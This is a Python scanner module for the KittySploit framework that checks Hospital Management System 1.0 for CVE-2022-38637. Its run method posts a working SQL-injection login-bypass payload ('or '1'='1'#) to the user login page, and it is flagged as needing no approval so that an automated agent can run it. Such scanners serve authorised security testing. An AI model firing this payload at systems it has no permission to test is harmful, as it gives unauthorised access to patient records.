#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hospital Management System 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hospital Management System 1.0 - SQL Injection Detection',
        'description': 'Hospital Management System 1.0 contains a SQL injection vulnerability via the editid parameter in /HMS/user-login.php. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'hms', 'cms', 'sqli', 'auth-bypass', 'hospital_management_system_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.youtube.com/watch?v=m8nW0p69UHU',
            'https://owasp.org/www-community/attacks/SQL_Injection',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-38637',
            'https://github.com/Henry4E36/POCS',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-38637',
    }

    def run(self):
        path = '/hms/user-login.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='username=admin%27+or+%271%27%3D%271%27%23&password=admin%27+or+%271%27%3D%271%27%23&submit=\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<title>User  | Dashboard</title>', 'Book My Appointment',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='Hospital Management System 1.0 - SQL Injection detected', path=path)
            return True
        return False

